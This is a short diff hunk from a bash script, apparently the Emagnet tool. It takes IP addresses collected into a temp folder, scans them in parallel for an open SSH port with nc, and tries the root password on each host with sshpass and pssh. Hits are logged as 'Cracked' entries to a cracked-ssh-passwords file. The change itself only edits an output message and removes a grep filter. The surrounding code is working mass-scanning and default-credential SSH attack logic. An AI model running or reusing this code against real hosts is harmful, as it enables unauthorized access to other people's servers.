@@ -744,12 +744,12 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
         printf "\n%64s\n\n" | tr ' ' '='
         sleep 2
         xargs -i -P $THREADS timeout 0.5 nc -zvn {} 22 < $SSHPORTSCAN 2>&1|awk '{print $3} /succeeded/ '|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $SSHTARGETS
-        echo -e "               $(cat $SSHTARGETS|wc -l) TARGETS $(cat $SSHPORTSCAN|wc -l) HAS PORT 22 OPEN"
+        echo -e "               $(cat $SSHTARGETS|wc -l) TARGETS of $(cat $SSHPORTSCAN|wc -l) HAS PORT 22 OPEN"
         printf "\n%64s\n" | tr ' ' '='
         sleep 2
 
        while read sshtargets; do
-          sshpass -p "root" pssh -I -A -h $SSHTARGETS "uptime" < $SSHTARGETS |grep SUCCESS
+          sshpass -p "root" pssh -I -A -h $SSHTARGETS "uptime" < $SSHTARGETS
 		if [[ $? -eq "0" ]]; then
 		    	echo -e "[\e[1;32m>>\e[0m] - Cracked $sshtargets: $SSHUSER:$SSHPASSWORD"
     			echo -e "================================================================"       >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
